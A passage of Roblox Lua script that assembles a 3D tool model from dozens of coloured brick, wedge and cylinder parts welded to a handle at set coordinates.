mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, 0.120735168, 0.562595844, 0, 0, 1, -1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.49999997, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.120735168, -1.36101627, -0.531545162, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.388072997))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.28339767, -0.375680447, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.43749997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.37998486, 0.256663799, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.124999993, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.474311411, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -8.17039299, 0.00204944611, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 1, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.41275597, 0.229718208, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0, 0.625231504, -1.04904175e-005, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.974999964, 0.849999964, 0.675000012))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00598144531, -0.108636856, 0.648684263, -0.342020124, 0.939692616, 0, 0.939692616, 0.342020124, 0, 0, 0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, 1.15403748, 0.256659985, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00267028809, -0.106860161, 0.648684263, -0.422618151, -0.906307757, 0, -0.906307757, 0.422618151, 0, 0, 0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00665950775, -0.105759621, 0.648684263, 0.42261824, 0.906307697, 0, 0.906307697, -0.42261824, 0, 0, 0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0, -1.04572105, -1.04904175e-005, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.56249994, 0.74999994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00364732742, -0.107065201, 0.648684263, 0.342020214, -0.939692557, 0, -0.939692557, -0.342020214, 0, 0, 0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00272464752, -0.103487015, 0.646622419, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.0624999963, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -2.02676964, 0.460892677, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.124999993, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00207138062, 0.549334526, -0.000723838806, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.81249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00207138062, 0.700427771, -0.000723838806, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.81249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.119354248, 1.20991611, -0.531184673, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -8.07449722, 0.104915142, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0, 0.819095135, -1.04904175e-005, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.74999994, 0.81249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -1.28304958, -0.579558372, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.81249994, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.139364243, 1.20991611, -0.531184673, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.130399704, 1.25269699, -0.226321697, 1, -8.74227766e-008, 0, 0, 0, 1, -8.74227766e-008, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-1.28511906, -0.130399704, 0.259450436, 0, 0, -1, -1, 8.74227766e-008, 0, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.139364243, -0.100700855, 1.37480354, 1, -8.74227766e-008, 0, 8.74227766e-008, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.607500017, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.114528656, 1.25269699, -0.226321697, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, 0.139364243, 0.557480812, 0, 0, 1, 1, 0, 0, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.49999997, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.011068821, -0.122804642, -1.45552635, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0874999985, 0.162500009))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.114528656, -1.31754303, 0.291165829, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.130399704, -1.31754303, -0.226321697, -1, 8.74227766e-008, 0, 0, 0, -1, -8.74227766e-008, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.011068821, -0.122804642, -1.2002573, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.506249964, 0.113124982, 0.506249964))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -0.202844143, -7.40597677, 0.999999881, 0, 0, 0, -0.99999994, 0, 0, 0, -0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -1.30443859, 1.14520788, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -1.28304958, -1.14520788, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -0.147681713, 8.22558403, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.31249997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.119354248, -1.32858467, 0.822336197, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, -0.119354248, 0.557480812, 0, 0, 1, 1, 0, 0, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.49999997, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -1.36928463, 0.854077816, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.366513371, 0.366513401))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -1.28304958, 0.00272464752, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.687500238, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -1.38032341, 0.260767937, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.124999993, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -1.41274834, 0.22357893, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.130399704, -1.31754303, 0.291165829, 1, -8.74227766e-008, 0, 0, 0, -1, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.122804642, -0.114547253, 1.37480354, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.607500017, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -1.39067554, -0.502212524, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.157987595, -0.108965397, -1.21406174, -1, 0, 0, 0, 1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.283499986, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.157987595, -0.0938639641, 1.35411167, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.485999972, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.157987595, -0.0744695663, 1.35411167, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.485999972, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -7.61087227, 0.215218544, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.49999997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 4.57678843, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -4.99874783, 0.00272464752, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 1, 0.9375))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.237294197, 0.114528656, -1.28511906, 0, -1, 0, -1, 0, 0, -0, -0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.114528656, 1.25269699, -0.204157829, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.259450436, 0.130399704, -1.28511906, 8.74227766e-008, 1, 0, 1, -8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -0.293530464, -7.59949827, -0.999999881, 0, 0, 0, 0.99999994, 0, 0, 0, -0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -7.9234066, 0.217978477, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -0.215218544, -7.40597677, -0.999999881, 0, 0, 0, 0.99999994, 0, 0, 0, -0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
